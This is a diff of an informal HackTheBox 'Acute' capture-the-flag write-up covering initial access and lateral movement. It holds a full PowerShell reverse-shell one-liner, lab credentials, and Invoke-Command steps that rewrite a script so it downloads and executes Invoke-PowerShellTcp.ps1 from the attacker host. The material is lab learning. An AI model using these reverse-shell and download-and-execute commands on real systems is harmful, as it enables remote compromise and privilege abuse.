@@ -64,6 +64,8 @@ Be throughout! - Missed the Password and PSWA intel - `Password1!`
 
 ![](loginexiftoolrequired.png)
 
+## Initial Access
+
 EDavies is the holder of the fine default password `Password1!`
 
 ![](pswainit.png)
@@ -110,7 +112,7 @@ Why is this there, my eyelids have icacls.exe icacls.exe under each.
 
 
 ```powershell
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.109',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.109',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 ![](runningontotherevshell.png)
@@ -132,12 +134,92 @@ Check for remote desktop users
 Feels good to know about `set`, but not good to not 2 is 1 the box... Learnt `dir env:`
 ![](direnv.png)
 Then my LOLSBAS started failing... 
-Given the `hostname` is `Acute-PC01` and the DC = `\\ATSSERVER`, which is the logon server, *but* becuase we have no external DC ports we must be in some kind of virtual environment.
+Given the `hostname` is `Acute-PC01` and the DC = `\\ATSSERVER`, which is the logon server, *but* becuase we have no external DC ports we must be in some kind of virtual environment. After a some fubbling around and a break. After following alond with meterpreter session [Alh4zr3d](https://www.youtube.com/@alh4zr3d3) screenshots presummable remembering that there is a console session on the machine with explorer.exe open for the lateral movement on this box. At this point given my concern about how this could be done without metasploit I proceeded to check other Writeups of this box. [0xdf](https://0xdf.gitlab.io/2022/07/16/htb-acute.html) uses meterpreter. Amusing returning to this part of writing this the odds of screenshotting at the exact moment that the entire lsit of powershell commands run by the scripted user is kind of mind boggling. It runs in a 1 minute loop. And to get the part where it use the `dc_manage` configuration before *immediately* closing the window is bonkers.
 
-## Exploit
+```ruby
+# Meterpreter has a powershell module
+load powershell 
+screenshare 
+```
 
-## Foothold
+![](usersonbox.png)
+
+TIL every write up used meterpreter. [zery](https://zery.cf/index.php/acute/), [Ippsec](https://www.youtube.com/watch?v=jDYte7xNY1g) [caueb](https://caueb.github.io/writeups/htb/boxes/acute/) uses meterpreter, but this command from the caueb is awesome! I am going go with this is a gimmick of the box.
+```powershell
+# Show directories that are whitelisted
+reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+```
+
+![](feelsweirdman.png)
+Never used meterpreter screenshare.
+
+![](badedavies.png)
+The key important detail here is not there! I missed the `-ConfigationName dc_manage`
+
+`acute\imonks`
+`w3_4R3_th3_f0rce.`
+
+```powershell
+$pass = convertto-securestring -asplaintext -force -string "W3_4R3_th3_f0rce."
+$cred = new-object -typename system.management.automation.pscredential -arguementlist "acute\imonks",$pass
+# Sometimes you need to use invoke command
+invoke-comand -computername ATSSERVER -ScriptBlock { <insertcommands> } -ConfigationName dc_manage -Credential $cred
+```
+The Invoke-Command cmdlet **runs commands on a local or remote computer and returns all output from the commands, including errors**. Using a single Invoke-Command command, you can run commands on multiple computers. To run a single command on a remote computer, use the ComputerName parameter.
+
+
+The struggle for me came from my screenshotting. Here is the import detail
+![](configname.png)
+Fortunately honestly and thankfully the logs are here to remind me of the OOF. 
+![](honestyisgood.png)
+Bit testing and playing around. Learnt that a better approach would be to start check what commands you run first. `get-command`
+![](imonkaswhoami.png)
+
+Tried spawning a shell in memory via the command above, which failed. 
+![](lstheusers.png)
+The script on the desktop
+![](jmorgancreds.png)
+
+Before I continue on with the video, I want to try a echo a webshell into the webshell of the wwwroot of inetpub, but icacls would have told me no permissions. 
+```powershell
+$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
+$passwd = $securepasswd | ConvertTo-SecureString
+$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
+Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
+```
+
+TIL about `IWR = Invoke-WebRequest` 
+
+Although powershelling along with Al was great and all I alway back up files after at atleast trying to be professional as possible. I guess maybe we can just paste it back in, but this got me worried enough considering the probablity of failing and having to reset the box. 
+
+This section was really slow.  
+```powershell
+$pass = convertto-securestring -asplaintext -force -string "W3_4R3_th3_f0rce."
+$cred = new-object -typename system.management.automation.pscredential("acute\imonks",$pass)
+
+# BEWARE THE PARENTHESES!
+
+invoke-command -computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ((Get-Content -Path C:\Users\imonks\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'C:\Utils\zzz.exe') | Set-Content -Path C:\Users\imonks\desktop\wm.ps1 }
+```
+[Use basic Parsing is deprecated as of 6.0.0](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)
+
+I had real trouble debug the changes as I missed an extra `)` and could not remove. My mistakes where in PARENTHESES. The problem with verbosity is nest paratheses are a nightmare to read.
+```powershell
+invoke-command -computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ((Get-Content -Path C:\Users\imonks\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'IEX(IWR http://10.10.14.109/Invoke-PowerShellTcp.ps1 -UseBasicParsing)') | Set-Content -Path C:\Users\imonks\desktop\wm.ps1)) }
+
+# and to replace the IWR!
+invoke-command -computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ((Get-Content -Path C:\Users\imonks\desktop\wm.ps1 -Raw) -replace 'IWR http://10.10.14.109/Invoke-PowerShellTcp.ps1 -UseBasicParsing', '(New-Object Net.WebClient).downloadString("http://10.10.14.109/Invoke-PowerShellTcp.ps1")') | set-Content -Path C:\Users\imonks\desktop\wm.ps1)) } 
+```
+
+![](hurrayforps.png)
+
+windows/x64/shell_reverse_tcp
+
 
 ## PrivEsc
+
+
+
+
 
       
